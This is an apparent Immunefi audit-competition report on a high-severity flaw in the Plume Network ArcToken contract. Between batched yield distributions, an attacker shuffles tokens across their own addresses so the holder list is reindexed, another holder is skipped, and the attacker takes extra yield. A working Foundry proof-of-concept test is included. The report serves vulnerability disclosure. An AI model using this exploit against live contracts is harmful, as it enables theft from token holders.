# 50527 sc high attacker can steal yield during batch distribution

**Submitted on Jul 25th 2025 at 17:49:51 UTC by @wellbyt3 for** [**Attackathon | Plume Network**](https://immunefi.com/audit-competition/plume-network-attackathon)

* Report ID: #50527
* Report Type: Smart Contract
* Report severity: High
* Target: <https://github.com/immunefi-team/attackathon-plume-network/blob/main/arc/src/ArcToken.sol>
* Impacts:
  * Theft of unclaimed yield

## Description

### Brief / Intro

An attacker can steal yield being distributed through `ArcToken::distributeYieldWithLimit()` by transferring ArcTokens between addresses in different batches.

### Vulnerability Details

`distributeYieldWithLimit` allows the `YIELD_DISTRIBUTOR_ROLE` to distribute yield in batches for tokens with a large number of token holders.

Example scenario (simplified):

* 100e18 of yield token distributed in 2 batches.
* Four ArcToken holder addresses, each with 10e18 ArcTokens (totalSupply = 40e18).
* Holders enumerated as:
  * Index 0: Holder 1
  * Index 1: Attacker (Address 1)
  * Index 2: Attacker (Address 2)
  * Index 3: Holder 2

During batch 1:

* Yield tokens are transferred to the ArcToken contract, then distributed pro rata based on current balances vs totalSupply.
* Holder 1 receives 25e18 yield tokens; Attacker (Address 1) receives 25e18.

Exploit (backrun and transfer between batches):

* The attacker backruns the first batch's `distributeYieldWithLimit()` and transfers their ArcTokens from Attacker (Address 1) to Attacker (Address 2) after Address 1 receives yield.
* Attacker (Address 1) balance becomes 0 and is removed from the holders enumerated list. When removed, the last index holder is moved into the removed index position.
* New enumerated list becomes:
  * Index 0: Holder 1
  * Index 1: Holder 2
  * Index 2: Attacker (Address 2)
* In batch 2, Attacker (Address 2) now holds 20e18 (50% of totalSupply) and can receive the remaining 50e18 yield tokens.
* Holder 2 is skipped because their index moved and the batch iteration misses them.

POC provided models this exact scenario.

### Impact Details

High — an attacker can steal yield by manipulating holder enumeration across batches.

### References

* <https://github.com/immunefi-team/attackathon-plume-network/blob/580cc6d61b08a728bd98f11b9a2140b84f41c802/arc/src/ArcToken.sol#L466>

## Proof of Concept

Below is the PoC test. Add a new `.t.sol` file in `arc/test`, paste the code, then run: forge test --mt test\_attackerCanStealYieldDuringBatchDistribution -vv

{% stepper %}
{% step %}

### Setup and deploy contracts

The test deploys RestrictionsFactory, RestrictionsRouter, ArcTokenFactory, a mock yield token, ArcTokenPurchase, and registers module types.
{% endstep %}

{% step %}

### Create ArcToken and mint holders

* Create an ArcToken via the factory.
* Mint 10e18 ArcTokens to four addresses: user1, attackerAddr1, attackerAddr2, user2.
* The attacker owns attackerAddr1 and attackerAddr2.
  {% endstep %}

{% step %}

### Distribute first batch

* The yield (100e18) is approved and `distributeYieldWithLimit(100e18, 0, 4)` is called to distribute in batches (include factory and creator slots that are present as zero-balance holders).
* After the first batch, attackerAddr1 receives its share (25e18).
  {% endstep %}

{% step %}

### Attacker transfers tokens between their addresses (backrun)

* attackerAddr1 transfers its 10e18 ArcTokens to attackerAddr2.
* attackerAddr1 becomes 0 balance and is removed from the holders enumeration, causing an index swap that moves Holder 2 into the removed slot.
  {% endstep %}

{% step %}

### Distribute second batch and observe theft

* Call `distributeYieldWithLimit(100e18, 4, 2)` for the 2nd batch.
* attackerAddr2 now receives disproportionate yield (total 75e18 across both attacker addresses), while user2 receives 0.
  {% endstep %}
  {% endstepper %}

Proof-of-concept test code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import { ArcToken } from "../src/ArcToken.sol";
import { ArcTokenFactory } from "../src/ArcTokenFactory.sol";
import { ArcTokenPurchase } from "../src/ArcTokenPurchase.sol";
import { ERC20Mock } from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import { Strings } from "@openzeppelin/contracts/utils/Strings.sol";
import { Test } from "forge-std/Test.sol";
import { console } from "forge-std/console.sol";

import { RestrictionsRouter } from "../src/restrictions/RestrictionsRouter.sol";
import { WhitelistRestrictions } from "../src/restrictions/WhitelistRestrictions.sol";
import { RestrictionsFactory } from "../src/restrictions/RestrictionsFactory.sol";
import { IAccessControl } from "@openzeppelin/contracts/access/IAccessControl.sol";
import { UUPSUpgradeable } from "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";


contract YieldThiefTest is Test {
    ArcTokenFactory public arcTokenFactory;
    RestrictionsRouter public router;
    RestrictionsFactory public restrictionsFactory;
    ERC20Mock public yieldToken;
    ArcTokenPurchase public arcTokenPurchase;


    bytes32 public constant TRANSFER_RESTRICTION_TYPE = keccak256("TRANSFER_RESTRICTION");
    bytes32 public constant YIELD_RESTRICTION_TYPE = keccak256("YIELD_RESTRICTION");
    bytes32 public constant GLOBAL_SANCTIONS_TYPE = keccak256("GLOBAL_SANCTIONS");
    
    address public admin = makeAddr("admin");
    address public arcTokenCreator = makeAddr("arcTokenCreator");
    address public user1 = makeAddr("user1");
    address public user2 = makeAddr("user2");
    address public attackerAddr1 = makeAddr("attackerAddr1");
    address public attackerAddr2 = makeAddr("attackerAddr2");

    function setUp() public {

        // 1. Deploy RestrictionsFactory
        RestrictionsFactory restrictionsFactoryImplementation = new RestrictionsFactory();
        bytes memory restrictionsFactoryInitData = abi.encodeWithSelector(
            RestrictionsFactory.initialize.selector
        );
        ERC1967Proxy restrictionsFactoryProxy = new ERC1967Proxy(
            address(restrictionsFactoryImplementation),
            restrictionsFactoryInitData
        );
        restrictionsFactory = RestrictionsFactory(address(restrictionsFactoryProxy));
        
        // 2. Deploy RestrictionsRouter
        vm.startPrank(admin);
        RestrictionsRouter routerImplementation = new RestrictionsRouter();
        bytes memory initData = abi.encodeWithSelector(
            RestrictionsRouter.initialize.selector,
            admin
        );
        ERC1967Proxy routerProxy = new ERC1967Proxy(
            address(routerImplementation),
            initData
        );
        router = RestrictionsRouter(address(routerProxy));

        // 3. Deploy ArcTokenFactory
        ArcTokenFactory factoryImplementation = new ArcTokenFactory();
        bytes memory factoryInitData = abi.encodeWithSelector(
            ArcTokenFactory.initialize.selector,
            address(router)
        );
        ERC1967Proxy factoryProxy = new ERC1967Proxy(
            address(factoryImplementation),
            factoryInitData
        );
        arcTokenFactory = ArcTokenFactory(address(factoryProxy));
        

        // 4. Deploy mock yield token
        yieldToken = new ERC20Mock();

        // 5. Deploy ArcTokenPurchase
        ArcTokenPurchase purchaseImplementation = new ArcTokenPurchase();
        bytes memory purchaseInitData = abi.encodeWithSelector(
            ArcTokenPurchase.initialize.selector,
            admin, 
            address(arcTokenFactory)
        );
        ERC1967Proxy purchaseProxy = new ERC1967Proxy(
            address(purchaseImplementation),
            purchaseInitData
        );
        arcTokenPurchase = ArcTokenPurchase(address(purchaseProxy));

        // 6. Register module types
        router.registerModuleType(TRANSFER_RESTRICTION_TYPE, false, address(0));
        router.registerModuleType(YIELD_RESTRICTION_TYPE, false, address(0));

        vm.stopPrank();        
    }

    function test_attackerCanStealYieldDuringBatchDistribution() public {
        // 1. Create a new ArcToken
        vm.startPrank(arcTokenCreator);
        address tokenAddress = arcTokenFactory.createToken(
            "A1", 
            "A1", 
            0, 
            address(yieldToken), 
            "https://a1.com", 
            address(0), 
            18
        );
        deal(address(yieldToken), arcTokenCreator, 100e18);
        ArcToken arcToken = ArcToken(tokenAddress);
        
        // 2. Four addresses are minted 10e18 arcTokens each, so each owns 25% of the total supply. 
        // One malicious user owns attackerAddr1 and attackerAddr2.
        arcToken.grantRole(arcToken.MINTER_ROLE(), arcTokenCreator);
        arcToken.grantRole(arcToken.YIELD_MANAGER_ROLE(), arcTokenCreator);
        arcToken.mint(user1, 10e18);
        arcToken.mint(attackerAddr1, 10e18);
        arcToken.mint(attackerAddr2, 10e18);
        arcToken.mint(user2, 10e18);

        vm.stopPrank();

        // 3. Yield is distributed to the 4 addresses, but in 2 batches. In reality
        // these batches would be much larger, but the same concept applies.
        vm.startPrank(arcTokenCreator);
        yieldToken.approve(address(arcToken), 100e18);
        // !IMPORTANT! The Factory and the arcTokenCreator are added as holder when the ArcToken is initialized, 
        // even though their balance is 0. We need to include them in the distributeYieldWithLimit call,
        // which is why we set the maxHolders to 4 instead of 2.
        arcToken.distributeYieldWithLimit(100e18, 0, 4);
        vm.stopPrank();

        // 4. The malicious user transfers their arcTokens from attackerAddr1 to attackerAddr2
        // before the next distributeYieldWithLimit is called.
        vm.startPrank(attackerAddr1);
        arcToken.transfer(attackerAddr2, 10e18);
        vm.stopPrank();

        // 5. The 2nd batch is distributed, but user2 receives 0 yields and the attacker receives 75% of 
        // the yield distributed instead of 50%.
        vm.startPrank(arcTokenCreator);
        arcToken.distributeYieldWithLimit(100e18, 4, 2);
        assertEq(yieldToken.balanceOf(attackerAddr1) + yieldToken.balanceOf(attackerAddr2), 75e18);
        assertEq(yieldToken.balanceOf(user2), 0);
        vm.stopPrank();

        console.log("user1 yieldToken balance:", yieldToken.balanceOf(user1));
        console.log("attackerAddr1 yieldToken balance:", yieldToken.balanceOf(attackerAddr1));
        console.log("attackerAddr2 yieldToken balance:", yieldToken.balanceOf(attackerAddr2));
        console.log("user2 yieldToken balance:", yieldToken.balanceOf(user2));
    }
}
```
